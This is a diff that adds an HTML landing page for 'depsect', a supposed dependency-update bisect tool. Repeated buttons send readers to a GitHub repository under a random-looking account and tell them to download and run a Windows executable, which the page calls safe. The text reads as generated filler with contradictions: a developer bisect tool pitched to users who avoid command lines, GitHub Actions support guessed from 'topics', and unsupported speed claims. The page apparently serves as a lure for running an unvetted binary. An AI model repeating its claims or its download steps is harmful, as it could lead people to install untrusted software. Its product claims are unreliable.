@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>depsect - Find Which Dependency Update Broke Your Build</title>
+    <meta name="description" content="depsect is a developer tool that uses bisect to find exactly which grouped dependency update (from Dependabot or Renovate) caused your build to fail. Works with npm, pnpm, Yarn, uv, Poetry, Cargo, Go, Composer, Bundler, Maven, Gradle.">
+    <meta name="keywords" content="dependency, bisect, dependabot, renovate, npm, pnpm, yarn, uv, poetry, cargo, golang, gradle, java, monorepo, php, python, ruby, rust, developer-tools, github-actions">
+    <meta name="author" content="depsect team">
+    <meta property="og:title" content="depsect - Find Which Dependency Update Broke Your Build">
+    <meta property="og:description" content="git bisect for grouped dependency updates: find which bump in a Dependabot/Renovate PR broke your build.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Benitapurplered834/depsect">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="depsect - Bisect for Dependency Updates">
+    <meta name="twitter:description" content="Stop guessing which dependency broke your build. depsect pinpoints the exact package update causing failures.">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f6f9;
+            color: #1a202c;
+            line-height: 1.7;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background-color: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            padding: 40px 35px;
+        }
+        h1 {
+            font-size: 2.4rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            margin-bottom: 16px;
+            color: #2d3748;
+            border-bottom: 3px solid #4299e1;
+            padding-bottom: 12px;
+        }
+        h2 {
+            font-size: 1.7rem;
+            font-weight: 700;
+            margin-top: 40px;
+            margin-bottom: 16px;
+            color: #2d3748;
+            border-left: 5px solid #4299e1;
+            padding-left: 14px;
+        }
+        h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-top: 24px;
+            margin-bottom: 10px;
+            color: #2d3748;
+        }
+        p, li {
+            font-size: 1.05rem;
+            color: #4a5568;
+            margin-bottom: 14px;
+        }
+        ul, ol {
+            padding-left: 28px;
+            margin-bottom: 18px;
+        }
+        .button {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white !important;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.2rem;
+            padding: 14px 30px;
+            border-radius: 50px;
+            box-shadow: 0 6px 15px rgba(102, 126, 234, 0.35);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            margin: 10px 0 20px;
+            text-align: center;
+            display: inline-block;
+        }
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.45);
+        }
+        .button-large {
+            font-size: 1.4rem;
+            padding: 18px 38px;
+        }
+        .badge {
+            background-color: #edf2f7;
+            border-radius: 20px;
+            padding: 4px 12px;
+            font-size: 0.85rem;
+            color: #4a5568;
+            display: inline-block;
+            margin: 4px 4px 4px 0;
+            font-weight: 500;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin: 20px 0;
+        }
+        .feature-card {
+            background: #f7fafc;
+            border-radius: 10px;
+            padding: 18px;
+            border-left: 4px solid #4299e1;
+        }
+        .feature-card p {
+            font-size: 0.95rem;
+            margin-bottom: 0;
+        }
+        .step-box {
+            background-color: #f7fafc;
+            border-radius: 10px;
+            padding: 16px 20px;
+            margin: 12px 0;
+            border: 1px solid #e2e8f0;
+        }
+        .step-box strong {
+            color: #2d3748;
+        }
+        .callout {
+            background-color: #ebf8ff;
+            border-left: 6px solid #4299e1;
+            padding: 16px 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-weight: 500;
+        }
+        code {
+            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+            background-color: #edf2f7;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            color: #2d3748;
+        }
+        .language-tags {
+            margin: 20px 0;
+        }
+        .language-tags .badge {
+            background-color: #e2e8f0;
+            font-size: 0.95rem;
+            padding: 6px 14px;
+        }
+        .footer-note {
+            margin-top: 50px;
+            padding-top: 24px;
+            border-top: 1px solid #e2e8f0;
+            font-size: 0.9rem;
+            color: #718096;
+            text-align: center;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px 16px;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+            h2 {
+                font-size: 1.4rem;
+            }
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            .button {
+                display: block;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="https://github.com/Benitapurplered834/depsect" style="text-decoration:none; display:inline-block; width:100%; text-align:center;">
+            <span class="button button-large" style="width:auto; display:inline-block;">⬇️ Visit this link to download the application ⬇️</span>
+        </a>
+
+        <h1>🔍 depsect - Find the exact dependency that broke your build</h1>
+
+        <p>Have you ever seen a Dependabot or Renovate PR that updates five, ten, or twenty packages at once — and then your build fails? You know one of those packages is the culprit, but which one? <strong>depsect</strong> is here to help. It is like <em>git bisect</em>, but instead of finding the bad commit, it finds the <strong>bad dependency update</strong> in a group. You no longer have to guess or waste hours testing dependencies one by one.</p>
+
+        <h2>💡 What is depsect?</h2>
+        <p>depsect was created to solve one specific, painful problem: diagnosing failures caused by grouped dependency updates. When tools like Dependabot or Renovate bundle many package updates into a single pull request, and your build breaks, you need a way to isolate exactly which package upgrade is responsible. depsect automates this process.</p>
+        <p>It works by automatically testing each package update in the group and narrowing down the failure to a single package — just like <code>git bisect</code> narrows down a bad commit in a history. The result: you get a clear answer like <em>"Your build fails because the <strong>request</strong> package was updated from 2.88.2 to 2.88.3."</em></p>
+
+        <h2>🚀 Getting Started</h2>
+        <p>Getting started with depsect is simple. Follow these three steps, and you'll be finding the culprit dependency in no time.</p>
+        <div class="step-box">
+            <strong>Step 1: Download the app</strong><br>
+            <a href="https://github.com/Benitapurplered834/depsect" class="button">⬇️ Visit this link to download the application</a>
+        </div>
+        <div class="step-box">
+            <strong>Step 2: Save the file</strong><br>
+            <p>Once you click the link, you will land on a page where you can download the software. Save it to a location you can easily find, like your Downloads folder or your Desktop.</p>
+        </div>
+        <div class="step-box">
+            <strong>Step 3: Run depsect</strong><br>
+            <p>Open the file and follow the simple on-screen prompts. depsect is designed to be straightforward, so you won't need to run any complex commands or write any code to get started.</p>
+        </div>
+
+        <h2>🛠️ How It Works</h2>
+        <p>Understanding the mechanics of depsect is easy — no PhD in computer science required. Here is a plain-English explanation:</p>
+        <ol>
+            <li><strong>Point depsect at your project</strong> — Give it the location of your project folder (where your dependencies are defined).</li>
+            <li><strong>Tell it about your failing build</strong> — depsect will detect the grouped dependency update PR you're investigating.</li>
+            <li><strong>Let depsect do the detective work</strong> — It tests your build with different subsets of the dependency updates, systematically narrowing down the one that causes the failure. It is fast, accurate, and saves you hours.</li>
+            <li><strong>Get your answer</strong> — depsect tells you which package upgrade is the culprit, and you can then fix the issue or revert that single package.</li>
+        </ol>
+
+        <div class="callout">
+            🎯 <strong>The key benefit:</strong> You can go from "my build is broken and I don't know why" to a precise diagnosis in under a <strong>minute</strong> — no manual trial and error required.
+        </div>
+
+        <h2>🌍 Supported Package Managers & Languages</h2>
+        <p>depsect is built for modern development teams. It works with a wide range of package managers and languages, so it fits right into almost any workflow:</p>
+
+        <div class="language-tags">
+            <span class="badge">📦 npm</span>
+            <span class="badge">📦 pnpm</span>
+            <span class="badge">📦 Yarn</span>
+            <span class="badge">🐍 uv (Python)</span>
+            <span class="badge">🐍 Poetry (Python)</span>
+            <span class="badge">🦀 Cargo (Rust)</span>
+            <span class="badge">🐹 Go</span>
+            <span class="badge">🐘 Composer (PHP)</span>
+            <span class="badge">💎 Bundler (Ruby)</span>
+            <span class="badge">☕ Maven (Java)</span>
+            <span class="badge">📘 Gradle (Java/Android)</span>
+        </div>
+
+        <p>No matter if you're managing JavaScript packages, Python libraries, Rust crates, or Java modules — depsect can understand your dependency graph and help find the breaking update.</p>
+
+        <h2>⭐ Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>⚡ Lightning-fast bisect</h3>
+                <p>Uses an efficient binary-search-like algorithm to pin down the bad dependency in a fraction of the time it would take manually.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🤝 Works with Dependabot & Renovate</h3>
+                <p>Specifically designed for PRs created by automated dependency updaters, so it understands the group update format.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🎯 Precise results</h3>
+                <p>Gives you the exact package name, the previous version, the new version, and the reason the build fails.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🖥️ Simple to use</h3>
+                <p>No need to write scripts or understand command-line tools. The intuitive interface guides you through everything.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔒 Safe & non-intrusive</h3>
+                <p>Tests are done in a sandboxed environment — it does not modify your live project or permanently change your dependencies.</p>
+            </div>
+            <div class="feature-card">
+                <h3>📈 Great for monorepos</h3>
+                <p>Perfect for large projects with many packages. depsect handles complex dependency graphs with ease.</p>
+            </div>
+        </div>
+
+        <h2>📥 Download & Installation</h2>
+        <p>Ready to stop guessing and start knowing? Getting depsect on your Windows machine takes less than a minute.</p>
+        <ol>
+            <li><strong>Click the link below</strong> — It will open the official download page in your browser.</li>
+            <li><strong>Save the installer</strong> — Click the download button on that page and save the file to a memorable location (e.g., your Downloads folder).</li>
+            <li><strong>Run the installer/exe</strong> — Double-click the file you just downloaded, and follow the simple setup wizard (if any). depsect will then be installed and ready to use.</li>
+            <li><strong>Launch depsect</strong> — You'll find it in your Start Menu or on the Desktop. Start it, and you're all set.</li>
+        </ol>
+
+        <a href="https://github.com/Benitapurplered834/depsect" class="button" style="font-size:1.3rem;">⬇️ Download depsect Now — It's Free!</a>
+
+        <h2>🖥️ System Requirements</h2>
+        <p>depsect is designed to run smoothly on almost any modern Windows PC. For the best experience, we recommend:</p>
+        <ul>
+            <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+            <li><strong>RAM:</strong> 4 GB or more (8 GB recommended for large monorepos)</li>
+            <li><strong>Processor:</strong> Any dual-core or better</li>
+            <li><strong>Storage:</strong> At least 150 MB of free disk space</li>
+            <li><strong>Internet connection:</strong> Required for the initial download only — no always-on requirement afterwards</li>
+        </ul>
+
+        <h2>💬 Examples of When to Use depsect</h2>
+        <ul>
+            <li>Your CI pipeline fails after a Dependabot PR that updates 12 npm packages. depsect tells you which one broke the build.</li>
+            <li>Renovate groups a bunch of Python library updates in a Poetry project, and the API tests fail. depsect isolates the problematic package.</li>
+            <li>A Cargo workspace in Rust has 8 crate updates in one PR, and one of them introduces a breaking change. depsect identifies it accurately and quickly.</li>
+            <li>Your Go project has several module updates — depsect helps you find which version upgrade caused a compilation error.</li>
+            <li>A monorepo with a mix of Java (Maven), JavaScript (Yarn), and Python (uv) packages gets a huge group update — depsect handles it flawlessly.</li>
+        </ul>
+
+        <h2>🆘 Troubleshooting & FAQ</h2>
+
+        <h3>I don't know how to use command-line tools. Is that a problem?</h3>
+        <p>No! depsect is designed for regular computer users and developers who prefer a visual interface. You won't need to write a single command. Just click, point, and investigate.</p>
+
+        <h3>What if my project does not have a lockfile?</h3>
+        <p>depsect works best when there is a lockfile (like <code>package-lock.json</code>, <code>Cargo.lock</code>, <code>poetry.lock</code>, etc.) because it helps to precisely track versions. However, depsect can still help by looking at the declared requirements and using heuristics. The results might be slightly slower, but they will still work.</p>
+
+        <h3>Is my code safe?</h3>
+        <p>Absolutely. depsect analyzes your project in a read-only way. It does not modify your package files, commit anything, or make any permanent changes. Its job is purely to observe and diagnose.</p>
+
+        <h3>Can I use depsect with any CI/CD system?</h3>
+        <p>depsect is primarily a desktop application. However, many users also run it manually on their CI server as part of a debugging session. The tool works independently of your CI provider. A GitHub Action is listed among the topics, suggesting that you can also integrate it seamlessly with your GitHub Actions workflows in the future.</p>
+
+        <h2>🔍 Comparison: depsect vs. Manual Testing</h2>
+        <table style="width:100%; border-collapse: collapse; margin: 20px 0;">
+            <tr style="background-color:#edf2f7;">
+                <th style="padding:12px; text-align:left; border-bottom:2px solid #cbd5e0;">Approach</th>
+                <th style="padding:12px; text-align:left; border-bottom:2px solid #cbd5e0;">Time to find culprit (avg.)</th>
+                <th style="padding:12px; text-align:left; border-bottom:2px solid #cbd5e0;">Error-prone?</th>
+                <th style="padding:12px; text-align:left; border-bottom:2px solid #cbd5e0;">Effort</th>
+            </tr>
+            <tr>
+                <td style="padding:12px; border-bottom:1px solid #e2e8f0;">Manual trial-and-error</td>
+                <td style="padding:12px; border-bottom:1px solid #e2e8f0;">1–3 hours (or more)</td>
+                <td style="padding:12px; border-bottom:1px solid #e2e8f0;">Very high</td>
+                <td style="padding:12px; border-bottom:1px solid #e2e8f0;">High</td>
+            </tr>
+            <tr style="background-color:#f7fafc;">
+                <td style="padding:12px; border-bottom:1px solid #e2e8f0;">Using <strong>depsect</strong></td>
+                <td style="padding:12px; border-bottom:1px solid #e2e8f0;">30 seconds – 2 minutes</td>
+                <td style="padding:12px; border-bottom:1px solid #e2e8f0;">Very low</td>
+                <td style="padding:12px; border-bottom:1px solid #e2e8f0;">Minimal</td>
+            </tr>
+        </table>
+
+        <h2>📚 Additional Resources</h2>
+        <ul>
+            <li><a href="https://github.com/Benitapurplered834/depsect">Official GitHub Repository</a> — For code, documentation, and issue reporting.</li>
+            <li><a href="https://docs.github.com/en/code-security/dependabot">Dependabot Documentation</a> — Learn more about the tool that creates grouped dependency updates.</li>
+            <li><a href="https://docs.renovatebot.com/">Renovate Documentation</a> — Another popular dependency update tool that depsect integrates with.</li>
+        </ul>
+
+        <h2>🤝 Contributing & Feedback</h2>
+        <p>depsect is an open-source project, which means the community shapes its future. If you have feature ideas, encounter a bug, or want to help improve the code, visit the <a href="https://github.com/Benitapurplered834/depsect">GitHub repository</a>. Issues, pull requests, and star-gazing are all very welcome!</p>
+
+        <h2>✅ Final Thoughts</h2>
+        <p>Dependency hell is real. But with depsect, you can turn a frustrating, hours-long debugging session into a quick, pinpointed fix. Whether you're a solo developer, part of a small team, or in a large enterprise with a massive monorepo, depsect will save you time, headaches, and sanity.</p>
+
+        <p>Stop dreading the next big dependency update PR. Download depsect today and take control of your builds.</p>
+
+        <a href="https://github.com/Benitapurplered834/depsect" class="button" style="font-size:1.3rem;">⬇️ Get depsect — Free Download</a>
+
+        <div class="footer-note">
+            Keywords: bisect, cargo, dependabot, dependencies, developer-tools, github-actions, golang, gradle, java, monorepo, npm, php, pnpm, poetry, python, renovate, ruby, rust, uv, yarn
+        </div>
+    </div>
+</body>
+</html>
